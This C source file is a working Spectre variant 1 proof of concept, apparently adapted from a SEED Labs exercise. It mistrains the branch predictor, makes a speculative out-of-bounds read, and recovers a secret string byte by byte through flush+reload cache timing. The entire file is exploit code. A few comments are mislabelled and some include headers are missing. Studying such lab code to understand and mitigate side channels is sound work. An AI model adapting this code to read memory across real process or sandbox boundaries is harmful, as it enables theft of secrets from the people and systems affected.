#include <stdio.h>
#include <stdint.h>

// Based on the lab material from Seed Labs
// https://seedsecuritylabs.org/Labs_16.04/System/Spectre_Attack/

#define TRAINING_LOOP_ITERATIONS 100
#define ATTACK_LOOP_ITERATIONS 1000
#define IDLE_LOOP_ITERATIONS 10000

#define PAGE_SIZE 4096
#define ARRAY_LENGTH 256

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

unsigned int buffer_size = 10;                  // Integer containing the size of the dummy array. This is used to initiate the speculative branching in restrictedAccess.
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};     // Probing array. This is used to read values outside the bounds of the array.
char *secret = "Some Secret Value";             // The target array.
uint8_t array[ARRAY_LENGTH * PAGE_SIZE];        // The side channel. The page corresponding to the byte result of the attack will be loaded into cache when the attack is performed.

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
    if (x < buffer_size) return buffer[x];
    return 0;
}

// Flushes buffer_size from the cache so it has to be requested from memory.
void flushBufferSize() { _mm_clflush(&buffer_size); }

// Initializes the side channel. (?)
void initializeSideChannel() { for (int i = 0; i < ARRAY_LENGTH; i++) array[i * PAGE_SIZE + DELTA] = 1; }

// Flushes buffer_size from the cache so it has to be requested from memory.
void flushSideChannel() { for (int i = 0; i < ARRAY_LENGTH; i++) _mm_clflush(&array[i * PAGE_SIZE +DELTA]); }

static int scores[ARRAY_LENGTH];

// Loads side channel and votes based on which pages are loaded before the threshold.
void reloadSideChannel()
{
    int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;
    for (i = 0; i < ARRAY_LENGTH; i++) {
        addr = &array[i * PAGE_SIZE + DELTA];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD) scores[i]++; 
    } 
}

// Performs the attack. Leaves a page from array loaded in cache that can be identified by reloadSideChannel.
void spectreAttack(size_t larger_x)
{
    // Train the CPU to pick the 'true' path in restrictedAccess.
    for (int i = 0; i < TRAINING_LOOP_ITERATIONS; i++) {
        flushBufferSize();
        restrictedAccess(i);  
    }

    // Flush the cache before the attack.
    flushBufferSize();
    flushSideChannel();

    // Wait for the cache to be flushed.
    volatile int z;
    for (z = 0; z < IDLE_LOOP_ITERATIONS; z++) { }

    // The actual attack.
    uint8_t s;
    s = restrictedAccess(larger_x);
    array[s * PAGE_SIZE + DELTA] += 88;
}

int main() {
    // Initializes the side channel.   
    //initializeSideChannel();

    for (int j = 0; j < strlen(secret); j++) {
        // The location of the byte we're interested in as an index relative to buffer.
        size_t larger_x = (size_t)(secret - (char*)buffer) + j;

        // Reset scores.
        for (int i = 0; i < ARRAY_LENGTH; i++) scores[i] = 0;

        // Attack loop. Repeats the attack multiple times to diminish the effect of noise.
        for (int i = 0; i < ATTACK_LOOP_ITERATIONS; i++) {
            spectreAttack(larger_x);
            reloadSideChannel();
        }

        // Counts votes of attack loop iterations.
        int max = 1;
        for (int i = 2; i < ARRAY_LENGTH; i++) if (scores[max] < scores[i]) max = i;

        // Prints result.
        printf("%c", max);
    }
}